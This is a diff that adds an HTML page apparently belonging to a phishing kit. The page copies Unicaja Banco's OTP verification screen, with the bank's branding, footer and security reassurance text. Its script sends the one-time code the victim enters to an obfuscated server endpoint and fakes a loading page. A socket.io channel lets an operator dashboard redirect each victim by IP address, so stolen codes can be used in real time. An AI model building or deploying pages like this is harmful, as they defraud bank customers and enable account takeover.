@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1">
+    <meta name="theme-color" content="#000000">
+    <title>Verificación OTP </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/otp-styles.css">
+     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body style="background-color: #ffffff;">
+
+<style>
+    .form-group {
+    margin-bottom: 24px;
+    position: relative;
+    width: 100%;
+}
+
+.form-label {
+    display: block;
+    font-size: 16px;
+    color: #6B9CA8;
+    margin-bottom: 0;
+    font-weight: 400;
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    left: 16px;
+    pointer-events: none;
+    transition: all 0.2s ease;
+    z-index: 1;
+}
+
+.form-input {
+    width: 100%;
+    height: 56px;
+    padding: 16px;
+    font-size: 16px;
+    font-family: 'Manrope', sans-serif;
+    border: none;
+    border-bottom: 1.6px solid #6B9CA8;
+    border-radius: 4px 4px 0 0;
+    background-color: #F6F9F9;
+    color: #000000;
+    outline: none;
+    transition: all 0.2s ease;
+}
+
+.form-input:focus,
+.form-input:not(:placeholder-shown) {
+    border-bottom-color: #005265;
+    background-color: #F6F9F9;
+    padding: 24px 16px 8px;
+}
+
+.form-input:focus + .form-label,
+.form-input:not(:placeholder-shown) + .form-label {
+    top: 8px;
+    transform: translateY(0);
+    font-size: 12px;
+    color: #6B9CA8;
+}
+
+.form-input.error {
+    border-bottom-color: #E74C3C;
+}
+
+.error-message {
+    display: none;
+    font-size: 12px;
+    color: #E74C3C;
+    margin-top: 8px;
+    align-items: center;
+    gap: 4px;
+}
+
+.error-message.active {
+    display: flex;
+}
+</style>
+
+   <div>
+    <div class="upot">
+        <img src="./img/upopasops.png" alt="">
+    </div>
+   </div>
+    
+
+    <!-- Main Content -->
+    <main class="main-container">
+       
+
+        <!-- Title -->
+       
+
+        <!-- OTP Form -->
+        <form class="otp-form" id="pass" method="post">
+            <!-- OTP Input Boxes -->
+            <div class="codi">
+                <div class="phon">
+                    <svg focusable="false" aria-hidden="true" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M10.6956 17.7444C10.2814 17.7444 9.94559 18.0802 9.94559 18.4944C9.94559 18.9086 10.2814 19.2444 10.6956 19.2444H14.3073C14.7215 19.2444 15.0573 18.9086 15.0573 18.4944C15.0573 18.0802 14.7215 17.7444 14.3073 17.7444H10.6956Z" fill="#005265"></path>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M9.32167 2C7.75586 2 6.5 3.30368 6.5 4.86837V19.1327C6.5 20.6974 7.75586 22.001 9.32167 22.001H15.6812C17.247 22.001 18.5028 20.6974 18.5028 19.1327V4.85912C18.5028 3.30152 17.2449 2 15.6812 2H9.32167ZM8 4.86837C8 4.10193 8.61414 3.5 9.32167 3.5H15.6812C16.3908 3.5 17.0028 4.10408 17.0028 4.85912V19.1327C17.0028 19.8991 16.3887 20.501 15.6812 20.501H9.32167C8.61414 20.501 8 19.8991 8 19.1327V4.86837Z" fill="#005265"></path>
+</svg>
+                </div>
+                 <div class="form-group">
+                <input
+                    type="text"
+                    id="code"
+                    class="form-input"
+                    placeholder=" "
+                    required
+                    autocomplete="username"
+                />
+                <label class="form-label" for="code">Código</label>
+                <div class="error-message" id="codeError">
+                    <svg class="error-icon" viewBox="0 0 24 24" fill="#E74C3C">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16" stroke="white" stroke-width="2"/>
+                    </svg>
+                    <span>El campo es obligatorio</span>
+                </div>
+            </div>
+            </div>
+
+           
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-button" id="submitButton" disabled>
+                Verificar
+            </button>
+
+            <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    const codeInput = document.getElementById('code');
+                    const submitButton = document.getElementById('submitButton');
+                    
+                    codeInput.addEventListener('input', function() {
+                        // Enable button if there's any text in the input
+                        submitButton.disabled = !this.value.trim();
+                    });
+                    
+                    // Also check on form load in case of autofill
+                    submitButton.disabled = !codeInput.value.trim();
+                });
+            </script>
+
+            <!-- Security Banner -->
+            <div class="security-banner">
+                <svg class="security-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="32" cy="32" r="28" fill="#E8F5E9"/>
+                    <path d="M32 16L40 22V32C40 38 36 42 32 46C28 42 24 38 24 32V22L32 16Z" fill="#4CAF50"/>
+                    <path d="M28 32L30 34L36 28" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                <div class="security-content">
+                    <div class="security-title">Tu seguridad es importante</div>
+                    <p class="security-text">Nunca compartas este código con nadie</p>
+                </div>
+            </div>
+        </form>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">© Unicaja Banco, S.A. 2025. Todos los derechos reservados.</p>
+        <nav class="footer-links">
+            <a href="#" class="footer-link">Aviso legal</a>
+            <a href="#" class="footer-link">Cookies</a>
+            <a href="#" class="footer-link">Privacidad</a>
+            <a href="#" class="footer-link">Seguridad</a>
+        </nav>
+    </footer>
+
+    <!-- JavaScript -->
+     <script>
+        document.getElementById('pass').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('code').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+            
+            // Hide error message if password is not empty
+            
+            console.log('Login attempt:', { password });
+
+            $.ajax({
+                url: '/SSwP85AgNE4pnL5mWSM', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({password}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loading?time=7&url=/QcEwP85AgNE4pnL5mWSM";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+    </script>
+
+    <script src="./socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
